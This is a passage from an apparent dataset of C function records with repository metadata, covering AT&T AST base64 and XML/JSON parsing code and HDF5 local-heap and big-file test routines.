fe);\n\t\t\ttp = tmp;\n\t\t}\n\t\telse\n\t\t\t*tp++ = '\\n';\n\t}\n done:\n\tif (fz)\n\t{\n\t\tif (tp >= te)\n\t\t{\n\t\t\tif (fn)\n\t\t\t\t*fn = fp;\n\t\t\tif (tn)\n\t\t\t\t*tn = tp;\n\t\t\tn = tp - (unsigned char*)tb + 1;\n\t\t\ttp = tmp;\n\t\t\tte = tp + sizeof(tmp) - B64_EC + 1;\n\t\t}\n\t\tb = *fp++ << 16;\n\t\tif (fz == 2)\n\t\t\tb |= *fp++ << 8;\n\t\t*tp++ = m[b >> 18];\n\t\t*tp++ = m[(b >> 12) & 077];\n\t\t*tp++ = (fz == 2) ? m[(b >> 6) & 077] : PAD;\n\t\t*tp++ = PAD;\n\t}\n\tif (n)\n\t\tn += (tp - tmp) - 1;\n\telse\n\t{\n\t\tif (tp > (unsigned char*)tb && *(tp - 1) == '\\n')\n\t\t\ttp--;\n\t\tif (tp < te)\n\t\t\t*tp = 0;\n\t\tn = tp - (unsigned char*)tb;\n\t\tif (tn)\n\t\t\t*tn = tp;\n\t\tif (fn)\n\t\t\t*fn = fp;\n\t}\n\treturn n;\n}", "path": "ast/src/lib/libast/string/base64.c", "commit_date": "2016-01-11 00:00:00", "repo_name": "att/ast", "stars": 522, "license": "epl-1.0", "language": "c", "size": 45884}
{"docstring": "/*\n * openf\n */\n", "func_signal": "static int\nxmlopen(Dss_t* dss, Dssdisc_t* disc)", "code": "{\n\tXml_t*\t\txml = (Xml_t*)dss->meth->data;\n\tField_t*\tf;\n\tField_t*\tg;\n\tCxvariable_t*\tv;\n\tint\t\ti;\n\n\tif (xml)\n\t{\n\t\tdss->cx->ctype['.'] |= CX_CTYPE_ALPHA;\n\t\tfor (i = 0; i < elementsof(local_callouts); i++)\n\t\t\tif (cxaddcallout(dss->cx, &local_callouts[i], disc))\n\t\t\t\treturn -1;\n\n\t\txml_beg_tag[0] = 1;\n\t\txml_beg_tag['<'] = 1;\n\n\t\txml_end_tag[0] = 1;\n\t\txml_end_tag['>'] = 1;\n\t\txml_end_tag[' '] = 1;\n\n\t\txml_end_att[0] = 1;\n\t\txml_end_att['\"'] = 1;\n\t\txml_end_att['>'] = 1;\n\n\t\tjson_beg_tag[0] = 2;\n\t\tjson_beg_tag[','] = 2;\n\t\tjson_beg_tag['{'] = 2;\n\t\tjson_beg_tag['}'] = 2;\n\n\t\tjson_end_val[0] = 2;\n\t\tjson_end_val['\\\\'] = 2;\n\t\tjson_end_val['\"'] = 2;\n\t\tjson_end_val[':'] = 2;\n\t\tjson_end_val[','] = 2;\n\t\tjson_end_val['{'] = 2;\n\t\tjson_end_val['}'] = 2;\n\t\tjson_end_val['['] = 2;\n\t\tjson_end_val[']'] = 2;\n\t\tjson_end_val[' '] = 1;\n\t\tjson_end_val['\\n'] = 1;\n\t\tjson_end_val['\\r'] = 1;\n\t\tjson_end_val['\\t'] = 1;\n\t\tjson_end_val['\\v'] = 1;\n\n\t\txml->prefix = -1;\n\t\tfor (f = xml->fields; f; f = g)\n\t\t{\n\t\t\tg = f->next;\n\t\t\tif (!(v = xmlvar(dss->cx, f->name, f->type, disc)))\n\t\t\t\treturn -1;\n\t\t\tv->format = f->format;\n\t\t\tfree(f->name);\n\t\t\tfree(f->type);\n\t\t\tfree(f);\n\t\t}\n\t}\n\treturn 0;\n}", "path": "ast/src/cmd/dsslib/xml/xml.c", "commit_date": "2016-01-11 00:00:00", "repo_name": "att/ast", "stars": 522, "license": "epl-1.0", "language": "c", "size": 45884}
{"docstring": "/*\n * xml fopenf\n */\n", "func_signal": "static int\nxmlfopen(Dssfile_t* file, Dssdisc_t* disc)", "code": "{\n\tregister Xml_t*\t\txml = (Xml_t*)file->dss->meth->data;\n\tregister unsigned char*\ts;\n\tregister unsigned char*\tt;\n\tregister int\t\tn;\n\tFile_t*\t\t\tf;\n\tint\t\t\tc;\n\tint\t\t\tm;\n\tint\t\t\tx;\n\tunsigned char*\t\tbuf;\n\tunsigned char*\t\tend;\n\n\tif (file->flags & DSS_FILE_WRITE)\n\t\tbuf = 0;\n\telse if (buf = (unsigned char*)sfreserve(file->io, SF_UNBOUND, 0))\n\t{\n\t\tend = buf + sfvalue(file->io) - 1;\n\t\tif (xml->prefix < 0)\n\t\t{\n\t\t\txml->image = !!(file->dss->flags & DSS_WRITE);\n\t\t\tif (file->format->readf == xmlread)\n\t\t\t{\n\t\t\t\tif (!xml->root)\n\t\t\t\t{\n\t\t\t\t\tif (disc->errorf)\n\t\t\t\t\t\t(*disc->errorf)(NiL, disc, 2, \"%s variable names must be qualified by at least the immediate containing tag\", file->format->name);\n\t\t\t\t\treturn -1;\n\t\t\t\t}\n\t\t\t\tx = *end;\n\t\t\t\t*end = 0;\n\t\t\t\ts = buf;\n\t\t\t\tn = 0;\n\t\t\t\tm = -1;\n\t\t\t\tfor (;;)\n\t\t\t\t{\n\t\t\t\t\twhile (!xml_beg_tag[*s++]);\n\t\t\t\t\tif (*(s - 1))\n\t\t\t\t\t{\n\t\t\t\t\t\tt = s;\n\t\t\t\t\t\twhile (!xml_end_tag[*s++]);\n\t\t\t\t\t\tif (*t == '/')\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tif (m > 0)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tm--;\n\t\t\t\t\t\t\t\tn -= s - t - 2;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse if (*t != '?')\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tm++;\n\t\t\t\t\t\t\tn += (c = s - t - 1);\n\t\t\t\t\t\t\tif (!memcmp(xml->root, t, c) && !*(xml->root + c))\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\telse if (s >= end)\n\t\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\t*end = x;\n\t\t\t\txml->prefix = m;\n\t\t\t\txml->maxlevel += m;\n\t\t\t\txml->maxname += n;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\txml->prefix = 0;\n\t\t\t\txml->maxname += 1024; /*XXX*/\n\t\t\t}\n\t\t}\n\t}\n\tif (!(f = vmnewof(file->vm, 0, File_t, 1, (xml->maxlevel + 1) * sizeof(char*) + xml->maxname + 1)))\n\t{\n\t\tif (disc->errorf)\n\t\t\t(*disc->errorf)(NiL, disc, ERROR_SYSTEM|2, \"out of space\");\n\t\treturn -1;\n\t}\n\tfile->data = f;\n\tf->name = (char*)(f + 1) + (xml->maxlevel + 1) * sizeof(char*);\n\tif (!(file->flags & DSS_FILE_WRITE))\n\t{\n\t\tif (buf)\n\t\t{\n\t\t\tf->cur = f->buf = buf;\n\t\t\tf->end = end;\n\t\t\tf->save = *end;\n\t\t\t*end = 0;\n\t\t}\n\t\telse\n\t\t\tf->buf = f->cur = f->end = (unsigned char*)null;\n\t\tf->image = xml->image;\n\t\tf->prefix = xml->prefix;\n\t\tf->maxlevel = xml->maxlevel;\n\t\tf->maxname = xml->maxname;\n\t\tf->maxvalue = 1024;\n\t\tf->root = xml->root;\n\t\tif (!(f->value = vmnewof(file->vm, 0, char, f->maxvalue, 0)))\n\t\t{\n\t\t\tvmfree(file->vm, f);\n\t\t\tif (disc->errorf)\n\t\t\t\t(*disc->errorf)(NiL, disc, ERROR_SYSTEM|2, \"out of space\");\n\t\t\treturn -1;\n\t\t}\n\t}\n\treturn 0;\n}", "path": "ast/src/cmd/dsslib/xml/xml.c", "commit_date": "2016-01-11 00:00:00", "repo_name": "att/ast", "stars": 522, "license": "epl-1.0", "language": "c", "size": 45884}
{"docstring": "/*\n * xml writef -- output current record\n */\n", "func_signal": "static int\njsonwrite(Dssfile_t* file, Dssrecord_t* record, Dssdisc_t* disc)", "code": "{\n\tregister File_t*\tr = (File_t*)record->data;\n\tsize_t\t\t\tn;\n\n\tif (r->prvlen && sfwrite(file->io, r->prv, r->prvlen) != r->prvlen)\n\t{\n\t\tif (disc->errorf)\n\t\t\t(*disc->errorf)(NiL, disc, ERROR_SYSTEM|2, \"%s: write error\", file->path);\n\t\treturn -1;\n\t}\n\tif ((n = r->cur - r->rec) && sfwrite(file->io, r->rec, n) != n)\n\t{\n\t\tif (disc->errorf)\n\t\t\t(*disc->errorf)(NiL, disc, ERROR_SYSTEM|2, \"%s: write error\", file->path);\n\t\treturn -1;\n\t}\n\tsfputc(file->io, '\\n');\n\treturn 0;\n}", "path": "ast/src/cmd/dsslib/xml/xml.c", "commit_date": "2016-01-11 00:00:00", "repo_name": "att/ast", "stars": 522, "license": "epl-1.0", "language": "c", "size": 45884}
{"docstring": "/*\n * close C program generator context\n */\n", "func_signal": "int\nexccclose(Excc_t* cc)", "code": "{\n\tint\tr = 0;\n\n\tif (!cc)\n\t\tr = -1;\n\telse\n\t{\n\t\tif (!(cc->ccdisc->flags & EX_CC_DUMP))\n\t\t{\n\t\t\tif (cc->ccdisc->text)\n\t\t\t\tsfclose(cc->ccdisc->text);\n\t\t\telse\n\t\t\t\tr = -1;\n\t\t}\n\t\tfree(cc);\n\t}\n\treturn r;\n}", "path": "ast/src/lib/libexpr/excc.c", "commit_date": "2016-01-11 00:00:00", "repo_name": "att/ast", "stars": 522, "license": "epl-1.0", "language": "c", "size": 45884}
{"docstring": "/*\n * open C program generator context\n */\n", "func_signal": "Excc_t*\nexccopen(Expr_t* expr, Exccdisc_t* disc)", "code": "{\n\tregister Excc_t*\tcc;\n\tchar*\t\t\tid;\n\n\tif (!(id = disc->id))\n\t\tid = \"\";\n\tif (!(cc = newof(0, Excc_t, 1, strlen(id) + 2)))\n\t\treturn 0;\n\tcc->expr = expr;\n\tcc->disc = expr->disc;\n\tcc->id = (char*)(cc + 1);\n\tcc->ccdisc = disc;\n\tif (!(disc->flags & EX_CC_DUMP))\n\t{\n\t\tsfprintf(disc->text, \"/* : : generated by %s : : */\\n\", exversion);\n\t\tsfprintf(disc->text, \"\\n#include <ast.h>\\n\");\n\t\tif (*id)\n\t\t\tsfsprintf(cc->id, strlen(id) + 2, \"%s_\", id);\n\t\tsfprintf(disc->text, \"\\n\");\n\t\tdtwalk(expr->symbols, global, cc);\n\t}\n\treturn cc;\n}", "path": "ast/src/lib/libexpr/excc.c", "commit_date": "2016-01-11 00:00:00", "repo_name": "att/ast", "stars": 522, "license": "epl-1.0", "language": "c", "size": 45884}
{"docstring": "/*\n * xml identf\n */\n", "func_signal": "static int\nxmlident(Dssfile_t* file, void* buf, size_t n, Dssdisc_t* disc)", "code": "{\n\tstatic const char\tmagic[] = \"<?xml\";\n\n\treturn (n > (sizeof(magic) - 1) && !memcmp(buf, magic, sizeof(magic) - 1));\n}", "path": "ast/src/cmd/dsslib/xml/xml.c", "commit_date": "2016-01-11 00:00:00", "repo_name": "att/ast", "stars": 522, "license": "epl-1.0", "language": "c", "size": 45884}
{"docstring": "/*-------------------------------------------------------------------------\n * Function:\trandll\n *\n * Purpose:\tCreate a random long long value.\n * \t\tEnsures that a write at this value doesn't overlap any\n *\t\tprevious write.\n *\n * Return:\tSuccess:\tRandom value\n *\n *\t\tFailure:\tRandom value which overlaps another write\n *\n * Programmer:\tRobb Matzke\n *              Tuesday, November 24, 1998\n *\n * Modifications:\n *\n *-------------------------------------------------------------------------\n */\n", "func_signal": "static hsize_t\nrandll(hsize_t limit, int current_index)", "code": "{\n    hsize_t\tacc;\n    int \toverlap = 1;\n    int \ti;\n    int \ttries = 0;\n\n    /* Generate up to MAX_TRIES random numbers until one of them */\n    /* does not overlap with any previous writes */\n    while(overlap != 0 && tries < MAX_TRIES)\n    {\n        acc = HDrandom();\n        acc *= HDrandom();\n        acc = acc % limit;\n        overlap = 0;\n\n        for(i = 0; i < current_index; i++)\n        {\n            if((acc >= values_used[i]) && (acc < values_used[i]+WRT_SIZE))\n                overlap = 1;\n            if((acc+WRT_SIZE >= values_used[i]) && (acc+WRT_SIZE < values_used[i]+WRT_SIZE))\n                overlap = 1;\n        }\n        tries++;\n    }\n\n    values_used[current_index]=acc;\n\n    return acc;\n}", "path": "rnnlib/hdf5_snap/test/big.c", "commit_date": "2015-08-10 00:00:00", "repo_name": "szcom/rnnlib", "stars": 894, "license": "gpl-3.0", "language": "c", "size": 10810}
{"docstring": "/* end test_sec2() */\n", "func_signal": "static int \ntest_stdio(hid_t fapl)", "code": "{\n    char\tfilename[1024];\n    fsizes_t\ttestsize;\n\n    testsize = supports_big();\n    if(testsize == NOFILE) {\n        HDfprintf(stdout, \"Test for stdio is skipped because file system does not support big files.\\n\");\n        goto quit;\n    }\n    HDputs(\"\\nTesting big file with the STDIO Driver \");\n\n    h5_fixname(FILENAME[2], fapl, filename, sizeof filename);\n\n    if(writer(filename, fapl, testsize, WRT_N))\n        goto error;\n    if(reader(filename, fapl))\n        goto error;\n    HDputs(\"Test passed with the STDIO Driver.\");\n\n    /* Flush stdout at the end of this test routine to ensure later\n     * output to stderr will not come out before it.\n     */\n\nquit:\n    /* End with normal return code */\n    /* Clean up the test file */\n    if(h5_cleanup(FILENAME, fapl))\n        HDremove(DNAME);\n    HDfflush(stdout);\n    return 0;\n\nerror:\n    HDputs(\"*** TEST FAILED ***\");\n    HDfflush(stdout);\n    return 1;\n}", "path": "rnnlib/hdf5_snap/test/big.c", "commit_date": "2015-08-10 00:00:00", "repo_name": "szcom/rnnlib", "stars": 894, "license": "gpl-3.0", "language": "c", "size": 10810}
{"docstring": "/*-------------------------------------------------------------------------\n * Function:\tH5HL_inc_rc\n *\n * Purpose:\tIncrement ref. count on heap\n *\n * Return:\tSuccess:\tNon-negative\n *\t\tFailure:\tNegative\n *\n * Programmer:\tQuincey Koziol\n *\t\tkoziol@hdfgroup.org\n *\t\tOct 12 2008\n *\n *-------------------------------------------------------------------------\n */\n", "func_signal": "static herr_t\nH5HL_inc_rc(H5HL_t *heap)", "code": "{\n    FUNC_ENTER_NOAPI_NOINIT_NOERR\n\n    /* check arguments */\n    HDassert(heap);\n\n    /* Increment heap's ref. count */\n    heap->rc++;\n\n    FUNC_LEAVE_NOAPI(SUCCEED)\n}", "path": "rnnlib/hdf5_snap/src/H5HLint.c", "commit_date": "2015-08-10 00:00:00", "repo_name": "szcom/rnnlib", "stars": 894, "license": "gpl-3.0", "language": "c", "size": 10810}
{"docstring": "/*-------------------------------------------------------------------------\n * Function:\treader\n *\n * Purpose:\tReads some data from random locations in the dataset.\n *\n * Return:\tSuccess:\t0\n *\n * \t\tFailure:\t>0\n *\n * Programmer:\tRobb Matzke\n *              Friday, April 10, 1998\n *\n * Modifications:\n *\n *-------------------------------------------------------------------------\n */\n", "func_signal": "static int\nreader(char *filename, hid_t fapl)", "code": "{\n    FILE\t*script = NULL;\n    hid_t\tfile = -1, mspace = -1, fspace = -1, d2 = -1;\n    char\tln[128], *s;\n    hsize_t\ths_offset[1];\n    hsize_t\ths_size[1] = {WRT_SIZE};\n    int\t\t*buf = (int *)HDmalloc(sizeof(int) * WRT_SIZE);\n    int\t\ti, j, zero, wrong, nerrors = 0;\n\n    /* Open script file */\n    script = HDfopen(DNAME, \"r\");\n\n    /* Open HDF5 file */\n    if((file = H5Fopen(filename, H5F_ACC_RDONLY, fapl)) < 0) FAIL_STACK_ERROR\n\n    /* Open the dataset */\n    if((d2 = H5Dopen2(file, \"d2\", H5P_DEFAULT)) < 0) FAIL_STACK_ERROR\n    if((fspace = H5Dget_space(d2)) < 0) FAIL_STACK_ERROR\n\n    /* Describe `buf' */\n    if((mspace = H5Screate_simple(1, hs_size, hs_size)) < 0) FAIL_STACK_ERROR\n\n    /* Read each region */\n    while(HDfgets(ln, (int)sizeof(ln), script)) {\n        if('#' != ln[0])\n            break;\n        i = (int)HDstrtol(ln + 1, &s, 10);\n        hs_offset[0] = HDstrtoll(s, NULL, 0);\n        HDfprintf(stdout, \"#%03d 0x%016Hx%47s\", i, hs_offset[0], \"\");\n        HDfflush(stdout);\n\n        if(H5Sselect_hyperslab(fspace, H5S_SELECT_SET, hs_offset, NULL,\n                hs_size, NULL) < 0) FAIL_STACK_ERROR\n                if(H5Dread(d2, H5T_NATIVE_INT, mspace, fspace, H5P_DEFAULT, buf) < 0)\n                    FAIL_STACK_ERROR\n\n                    /* Check */\n                    for(j = zero = wrong = 0; j < WRT_SIZE; j++) {\n                        if(0 == buf[j])\n                            zero++;\n                        else if(buf[j] != i + 1)\n                            wrong++;\n                    }\n        if(zero) {\n            H5_FAILED();\n            printf(\"    %d zero%s\\n\", zero, 1 == zero ? \"\" : \"s\");\n        } else if(wrong) {\n            SKIPPED();\n            HDputs(\"    Possible overlap with another region.\");\n            nerrors++;\n        } else {\n            PASSED();\n        }\n    }\n\n    if(H5Dclose(d2) < 0) FAIL_STACK_ERROR\n            if(H5Sclose(mspace) < 0) FAIL_STACK_ERROR\n            if(H5Sclose(fspace) < 0) FAIL_STACK_ERROR\n            if(H5Fclose(file) < 0) FAIL_STACK_ERROR\n            HDfree(buf);\n    HDfclose(script);\n\n    return nerrors;\n\nerror:\n    H5E_BEGIN_TRY {\n        H5Dclose(d2);\n        H5Sclose(mspace);\n        H5Sclose(fspace);\n        H5Fclose(file);\n    } H5E_END_TRY;\n    if(buf)\n        HDfree(buf);\n    if(script)\n        HDfclose(script);\n    return 1;\n}", "path": "rnnlib/hdf5_snap/test/big.c", "commit_date": "2015-08-10 00:00:00", "repo_name": "szcom/rnnlib", "stars": 894, "license": "gpl-3.0", "language": "c", "size": 10810}
{"docstring": "/*-------------------------------------------------------------------------\n * Function:\tH5HL_dblk_dest\n *\n * Purpose:\tDestroy a local heap data block object\n *\n * Return:\tSuccess:\tNon-negative\n *\t\tFailure:\tNegative\n *\n * Programmer:\tQuincey Koziol\n *\t\tkoziol@hdfgroup.org\n *\t\tOct 12 2008\n *\n *-------------------------------------------------------------------------\n */\n", "func_signal": "herr_t\nH5HL_dblk_dest(H5HL_dblk_t *dblk)", "code": "{\n    herr_t ret_value = SUCCEED;         /* Return value */\n\n    FUNC_ENTER_NOAPI(FAIL)\n\n    /* check arguments */\n    HDassert(dblk);\n\n    /* Check if data block was initialized */\n    if(dblk->heap) {\n        /* Unlink data block from heap */\n        dblk->heap->dblk = NULL;\n\n        /* Unpin the local heap prefix */\n        if(H5AC_unpin_entry(dblk->heap->prfx) < 0)\n            HGOTO_ERROR(H5E_HEAP, H5E_CANTUNPIN, FAIL, \"can't unpin local heap prefix\")\n\n        /* Decrement ref. count on heap data structure */\n        if(H5HL_dec_rc(dblk->heap) < 0)\n            HGOTO_ERROR(H5E_HEAP, H5E_CANTDEC, FAIL, \"can't decrement heap ref. count\")\n\n        /* Unlink heap from data block */\n        dblk->heap = NULL;\n    } /* end if */\n\n    /* Free local heap data block */\n    dblk = H5FL_FREE(H5HL_dblk_t, dblk);\n\ndone:\n    FUNC_LEAVE_NOAPI(ret_value)\n}", "path": "rnnlib/hdf5_snap/src/H5HLint.c", "commit_date": "2015-08-10 00:00:00", "repo_name": "szcom/rnnlib", "stars": 894, "license": "gpl-3.0", "language": "c", "size": 10810}
{"docstring": "/*-------------------------------------------------------------------------\n * Function:\tH5HL_dblk_new\n *\n * Purpose:\tCreate a new local heap data block object\n *\n * Return:\tSuccess:\tnon-NULL pointer to new local heap data block\n *\t\tFailure:\tNULL\n *\n * Programmer:\tQuincey Koziol\n *\t\tkoziol@hdfgroup.org\n *\t\tOct 12 2008\n *\n *-------------------------------------------------------------------------\n */\n", "func_signal": "H5HL_dblk_t *\nH5HL_dblk_new(H5HL_t *heap)", "code": "{\n    H5HL_dblk_t *dblk = NULL;       /* New local heap data block */\n    H5HL_dblk_t *ret_value;         /* Return value */\n\n    FUNC_ENTER_NOAPI(NULL)\n\n    /* check arguments */\n    HDassert(heap);\n\n    /* Allocate new local heap data block */\n    if(NULL == (dblk = H5FL_CALLOC(H5HL_dblk_t)))\n\tHGOTO_ERROR(H5E_HEAP, H5E_CANTALLOC, NULL, \"memory allocation failed\")\n\n    /* Increment ref. count on heap data structure */\n    if(H5HL_inc_rc(heap) < 0)\n\tHGOTO_ERROR(H5E_HEAP, H5E_CANTINC, NULL, \"can't increment heap ref. count\")\n\n    /* Link the heap & the data block */\n    dblk->heap = heap;\n    heap->dblk = dblk;\n\n    /* Set the return value */\n    ret_value = dblk;\n\ndone:\n    FUNC_LEAVE_NOAPI(ret_value)\n}", "path": "rnnlib/hdf5_snap/src/H5HLint.c", "commit_date": "2015-08-10 00:00:00", "repo_name": "szcom/rnnlib", "stars": 894, "license": "gpl-3.0", "language": "c", "size": 10810}
{"docstring": "/*-------------------------------------------------------------------------\n * Function:\tH5HL_prfx_new\n *\n * Purpose:\tCreate a new local heap prefix object\n *\n * Return:\tSuccess:\tnon-NULL pointer to new local heap prefix\n *\t\tFailure:\tNULL\n *\n * Programmer:\tQuincey Koziol\n *\t\tkoziol@hdfgroup.org\n *\t\tOct 12 2008\n *\n *-------------------------------------------------------------------------\n */\n", "func_signal": "H5HL_prfx_t *\nH5HL_prfx_new(H5HL_t *heap)", "code": "{\n    H5HL_prfx_t *prfx = NULL;       /* New local heap prefix */\n    H5HL_prfx_t *ret_value;         /* Return value */\n\n    FUNC_ENTER_NOAPI(NULL)\n\n    /* check arguments */\n    HDassert(heap);\n\n    /* Allocate new local heap prefix */\n    if(NULL == (prfx = H5FL_CALLOC(H5HL_prfx_t)))\n\tHGOTO_ERROR(H5E_HEAP, H5E_CANTALLOC, NULL, \"memory allocation failed\")\n\n    /* Increment ref. count on heap data structure */\n    if(H5HL_inc_rc(heap) < 0)\n\tHGOTO_ERROR(H5E_HEAP, H5E_CANTINC, NULL, \"can't increment heap ref. count\")\n\n    /* Link the heap & the prefix */\n    prfx->heap = heap;\n    heap->prfx = prfx;\n\n    /* Set the return value */\n    ret_value = prfx;\n\ndone:\n    FUNC_LEAVE_NOAPI(ret_value)\n}", "path": "rnnlib/hdf5_snap/src/H5HLint.c", "commit_date": "2015-08-10 00:00:00", "repo_name": "szcom/rnnlib", "stars": 894, "license": "gpl-3.0", "language": "c", "size": 10810}
{"docstring": "/*-------------------------------------------------------------------------\n * Function:\tH5HL_dest\n *\n * Purpose:\tDestroys a heap in memory.\n *\n * Return:\tNon-negative on success/Negative on failure\n *\n * Programmer:\tQuincey Koziol\n *\t\tkoziol@ncsa.uiuc.edu\n *\t\tJan 15 2003\n *\n *-------------------------------------------------------------------------\n */\n", "func_signal": "herr_t\nH5HL_dest(H5HL_t *heap)", "code": "{\n    FUNC_ENTER_NOAPI_NOINIT_NOERR\n\n    /* check arguments */\n    HDassert(heap);\n\n    /* Verify that node is unused */\n    HDassert(heap->prots == 0);\n    HDassert(heap->rc == 0);\n    HDassert(heap->prfx == NULL);\n    HDassert(heap->dblk == NULL);\n\n    if(heap->dblk_image)\n        heap->dblk_image = H5FL_BLK_FREE(lheap_chunk, heap->dblk_image);\n    while(heap->freelist) {\n        H5HL_free_t\t*fl;\n\n        fl = heap->freelist;\n        heap->freelist = fl->next;\n        fl = H5FL_FREE(H5HL_free_t, fl);\n    } /* end while */\n    heap = H5FL_FREE(H5HL_t, heap);\n\n    FUNC_LEAVE_NOAPI(SUCCEED)\n}", "path": "rnnlib/hdf5_snap/src/H5HLint.c", "commit_date": "2015-08-10 00:00:00", "repo_name": "szcom/rnnlib", "stars": 894, "license": "gpl-3.0", "language": "c", "size": 10810}
{"docstring": "/*-------------------------------------------------------------------------\n * Function:\tmain\n *\n * Purpose:\n *\n * Return:\tSuccess:\n *\n *\t\tFailure:\n *\n * Programmer:\tRobb Matzke\n *              Friday, April 10, 1998\n *\n * Modifications:\n *\t\tAlbert Cheng, 2002/03/28\n *\t\tAdded command option -fsize.\n *\t\tAlbert Cheng, 2002/04/19\n *\t\tAdded command option -c.\n *\n *              Raymond Lu, 2007/05/25\n *              Added similar tests for SEC2 and STDIO drivers.\n *\n *-------------------------------------------------------------------------\n */\n", "func_signal": "int\nmain (int ac, char **av)", "code": "{\n    unsigned long seed = 0;             /* Random # seed */\n    hid_t fapl = -1;\n    hid_t driver = -1;\n\n    /* parameters setup */\n\n    while (--ac > 0){\n        av++;\n        if (HDstrcmp(\"-fsize\", *av)==0){\n            /* specify a different family file size */\n            ac--; av++;\n            if (ac > 0) {\n                family_size_def = (hsize_t)HDstrtoull(*av, NULL, 0);\n            }\n            else{\n                printf(\"***Missing fsize value***\\n\");\n                usage();\n                return 1;\n            }\n        }\n        else if (HDstrcmp(\"-c\", *av)==0){\n            /* turn off file system check before test */\n            cflag=0;\n        }\n        else if (HDstrcmp(\"-h\", *av)==0){\n            usage();\n            return 0;\n        }else{\n            usage();\n            return 1;\n        }\n    }\n\n    /* check VFD to see if this is one we test */\n    if((fapl = h5_fileaccess()) < 0)\n        goto error;\n    if((driver = H5Pget_driver(fapl)) < 0)\n        goto error;\n\n    /* check sparse file support unless cflag is not set. */\n    if(cflag)\n        sparse_support = is_sparse();\n\n    /* Choose random # seed */\n    seed = (unsigned long)HDtime(NULL);\n#ifdef QAK\n    /* seed = (unsigned long)1155438845; */\n    HDfprintf(stderr, \"Random # seed was: %lu\\n\", seed);\n#endif /* QAK */\n    HDsrandom(seed);\n\n    /* run VFD-specific test */\n    if(H5FD_SEC2 == driver) {\n        if(test_sec2(fapl) != 0)\n            goto error;\n    }\n    else if(H5FD_STDIO == driver) {\n        if(test_stdio(fapl) != 0)\n            goto error;\n    }\n    else if(H5FD_FAMILY == driver) {\n        if(test_family(fapl) != 0)\n            goto error;\n    }\n    else\n        HDputs(\"This VFD is not supported\");\n\n    /* End with normal exit code */\n    /* fapls are cleaned up in the vfd test code */\n    return 0;\n\nerror:\n    HDputs(\"*** TEST FAILED ***\");\n    if(fapl > 0)\n        H5Pclose(fapl);\n    return 1;\n}", "path": "rnnlib/hdf5_snap/test/big.c", "commit_date": "2015-08-10 00:00:00", "repo_name": "szcom/rnnlib", "stars": 894, "license": "gpl-3.0", "language": "c", "size": 10810}
{"docstring": "/*-------------------------------------------------------------------------\n * Function:\tH5HL_prfx_dest\n *\n * Purpose:\tDestroy a local heap prefix object\n *\n * Return:\tSuccess:\tNon-negative\n *\t\tFailure:\tNegative\n *\n * Programmer:\tQuincey Koziol\n *\t\tkoziol@hdfgroup.org\n *\t\tOct 12 2008\n *\n *-------------------------------------------------------------------------\n */\n", "func_signal": "herr_t\nH5HL_prfx_dest(H5HL_prfx_t *prfx)", "code": "{\n    herr_t ret_value = SUCCEED;         /* Return value */\n\n    FUNC_ENTER_NOAPI(FAIL)\n\n    /* check arguments */\n    HDassert(prfx);\n\n    /* Check if prefix was initialized */\n    if(prfx->heap) {\n        /* Unlink prefix from heap */\n        prfx->heap->prfx = NULL;\n\n        /* Decrement ref. count on heap data structure */\n        if(H5HL_dec_rc(prfx->heap) < 0)\n            HGOTO_ERROR(H5E_HEAP, H5E_CANTDEC, FAIL, \"can't decrement heap ref. count\")\n\n        /* Unlink heap from prefix */\n        prfx->heap = NULL;\n    } /* end if */\n\n    /* Free local heap prefix */\n    prfx = H5FL_FREE(H5HL_prfx_t, prfx);\n\ndone:\n    FUNC_LEAVE_NOAPI(ret_value)\n}", "path": "rnnlib/hdf5_snap/src/H5HLint.c", "commit_date": "2015-08-10 00:00:00", "repo_name": "szcom/rnnlib", "stars": 894, "license": "gpl-3.0", "language": "c", "size": 10810}
{"docstring": "/*-------------------------------------------------------------------------\n * Function:\twriter\n *\n * Purpose:\tCreates a *big* dataset.\n *\n * Return:\tSuccess:\t0\n *\n *\t\tFailure:\t>0\n *\n * Programmer:\tRobb Matzke\n *              Wednesday, April  8, 1998\n *\n * Modifications:\n * \tRobb Matzke, 15 Jul 1998\n *\tAddresses are written to the file DNAME instead of stdout.\n *\n *-------------------------------------------------------------------------\n */\n", "func_signal": "static int\nwriter (char* filename, hid_t fapl, fsizes_t testsize, int wrt_n)", "code": "{\n    hsize_t\tsize1[4] = {8, 1024, 1024, 1024};\n    hsize_t\tsize2[1] = {GB8LL};\n    hsize_t\ths_start[1];\n    hsize_t\ths_size[1];\n    hid_t\tfile=-1, space1=-1, space2=-1, mem_space=-1, d1=-1, d2=-1;\n    int\t\t*buf = (int*)HDmalloc (sizeof(int) * WRT_SIZE);\n    int\t\ti, j;\n    FILE\t*out = HDfopen(DNAME, \"w\");\n    hid_t       dcpl;\n\n    switch(testsize){\n    case LFILE:\n        TESTING(\"Large dataset write(2GB)\");\n        /* reduce size1 to produce a 2GB dataset */\n        size1[1] = 1024/16;\n        size2[0] /= 16;\n        break;\n\n    case XLFILE:\n        TESTING(\"Extra large dataset write(4GB)\");\n        /* reduce size1 to produce a 4GB dataset */\n        size1[1] = 1024/8;\n        size2[0] /= 8;\n        break;\n\n    case HUGEFILE:\n        TESTING(\"Huge dataset write\");\n        /* Leave size1 as 32GB */\n        break;\n\n    case SFILE:\n        TESTING(\"small dataset write(1GB)\");\n        /* reduce size1 to produce a 1GB dataset */\n        size1[1] = 1024/32;\n        size2[0] /= 32;\n        break;\n\n    case NOFILE:\n        /* what to do?? */\n        HDfprintf(stdout, \"Unexpected file size of NOFILE\\n\");\n        goto error;\n        break;\n\n    default:\n        HDfprintf(stdout, \"Unexpected file size(%d)\\n\", testsize);\n        goto error;\n        break;\n    }\n\n    /*\n     * We might be on a machine that has 32-bit files, so create an HDF5 file\n     * which is a family of files.  Each member of the family will be 1GB\n     */\n    if ((file=H5Fcreate(filename, H5F_ACC_TRUNC, H5P_DEFAULT, fapl)) < 0) {\n        goto error;\n    }\n\n    /* Create simple data spaces according to the size specified above. */\n    if ((space1 = H5Screate_simple (4, size1, size1)) < 0 ||\n            (space2 = H5Screate_simple (1, size2, size2)) < 0) {\n        goto error;\n    }\n\n    /* Create the datasets */\n    /*\n     *  The fix below is provided for 